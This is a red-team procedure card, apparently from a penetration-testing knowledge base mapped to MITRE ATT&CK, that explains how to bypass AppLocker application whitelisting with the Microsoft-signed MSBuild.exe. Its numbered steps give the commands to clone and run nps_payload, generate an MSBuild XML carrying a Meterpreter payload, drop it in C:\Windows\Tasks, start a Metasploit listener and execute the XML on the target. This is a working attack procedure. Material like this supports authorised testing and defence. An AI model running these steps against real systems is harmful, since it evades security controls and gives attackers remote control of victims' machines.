---
id: 9d2cb5e5-7584-40cc-8c57-39c6cadc0713
name: Windows AppLocker Whitelist Bypass (MSBuild.exe)
type: procedure
verified: true
submitted: true
created_at: '2019-11-14T23:38:41.718812+00:00'
updated_at: '2023-05-25T19:42:14.035579+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Trusted Developer Utilities|T1127 - Trusted Developer Utilities]]'
platforms:
- Windows
tags:
- '[[applocker]]'
- '[[Defense Bypass]]'
commands:
- '[[C:\windows\Microsoft.net\Framework\$_VERSION\MSBui]]'
- '[[Git Download and Install nps_payload]]'
- '[[Metasploit Load a Resource File]]'
- '[[MSBuild Build Package from XML]]'
- '[[nps payload Execute and Build]]'
---

# Windows AppLocker Whitelist Bypass (MSBuild.exe)

**Status**: âœ“ Verified

## Summary

AppLocker allows administrators to define rules on which programs can be executed. A common setting is to block execution of programs not signed and trusted by Microsoft, which mitigates many attacks. Despite this, it is possible to bypass these AppLocker restrictions if users are able to execute M

## Description

# Description

AppLocker allows administrators to define rules on which programs can be executed. A common setting is to block execution of programs not signed and trusted by Microsoft, which mitigates many attacks. Despite this, it is possible to bypass these AppLocker restrictions if users are able to execute MSBuild.exe, a Microsoft signed program used for compile other programs, and often whitelisted by AppLocker.  In such cases, a special payload can be executed which will execute the attacker's code.



# Instructions

1. Clone the [nps payload](https://github.com/trustedsec/nps_payload) repository and install requirements.  This tool generates an XML file which can be run on the target using MSBuild.exe and executing a Meterpreter payload.





**Command** ([[Git Download and Install nps_payload]]):

```bash
git clone https://github.com/trustedsec/nps_payload.git
cd nps_payload && pip install -r requirements.txt
```





2. Run nps_payload and follow the instructions to generate a payload. In this example, a Meterpreter payload is selected.





**Command** ([[nps payload Execute and Build]]):

```bash
python2 nps_payload.py 
```



This will create the file msbuild_nps.xml (copy to attacker) and msbuild_nps.rc (launch locally with Metasploit).



3. A directory must be found on the target to which the current user can write. Writable paths vary depending on configuration, but some common ones exist. Use the "Placing files in writable paths" section of the [Ultimate AppLocker Bypass List](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md) to find a writable path.



The directory C:\Windows\Tasks is used for this procedure.



4. Copy msbuild_nps.xml to the target host.

5. On the attacker, launch msfconsole with the .rc file generated by nps_payload.





**Command** ([[Metasploit Load a Resource File]]):

```bash
msfconsole -r $_FILENAME.rc
```





6. Locate MSBuild.exe on the target, typically located in a .NET framework directory found in: C:\Windows\Microsoft.net\Framework

nps_payload uses .NET 4, so look for a directory focused on that version, such as: C:\windows\Microsoft.net\Framework\v4.0.30319\



7.Execute MSBuild.exe, specifying the msbuild_nps.xml file created earlier.





**Command** ([[C:\windows\Microsoft.net\Framework\$_VERSION\MSBui]]):

```bash
C:\windows\Microsoft.net\Framework\$_VERSION\MSBuild.exe C:\Windows\Tasks\$_FILENAME.xml
```





## Platforms

- Windows

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]

### Techniques

- [[Trusted Developer Utilities|T1127 - Trusted Developer Utilities]]

## Commands Used

- [[C:\windows\Microsoft.net\Framework\$_VERSION\MSBui]]
- [[Git Download and Install nps_payload]]
- [[Metasploit Load a Resource File]]
- [[MSBuild Build Package from XML]]
- [[nps payload Execute and Build]]

## Tags

- [[applocker]]
- [[Defense Bypass]]


